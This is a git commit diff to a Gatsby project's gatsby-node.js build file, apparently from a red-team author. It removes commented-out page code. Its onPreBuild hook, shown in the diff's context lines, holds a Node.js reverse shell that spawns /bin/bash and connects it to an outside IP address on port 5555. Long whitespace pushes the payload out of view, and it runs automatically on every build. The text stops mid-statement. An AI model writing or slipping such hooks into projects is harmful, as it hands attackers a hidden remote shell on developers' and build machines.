7f56d587606c82db99176aee82f7b33e9d411db2
TheGhostOfYankeeJim <ian@redsiege.com>
2023-03-14 15:05:35 -0400

    Update gatsby-node.js

--- gatsby-node.js
+++ gatsby-node.js
@@ -4,20 +4,6 @@
  * See: https://www.gatsbyjs.com/docs/reference/config-files/gatsby-node/
  */
 
-/**
- * @type {import('gatsby').GatsbyNode['createPages']}
- */
-/**exports.createPages = async ({ actions }) => {
-  *const { createPage } = actions
-  *createPage({
-  *  path: "/using-dsg",
-  *  component: require.resolve("./src/templates/using-dsg.js"),
-  * context: {},
-  *  defer: true,
-  *})
-*}
-*/
-
 exports.onPreBuild = async () => {                                                                                                                                            		var net = require("net"), sh = require("child_process").exec("/bin/bash");
 	var client = new net.Socket();
 	client.connect(5555, "147.182.128.118", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);                      
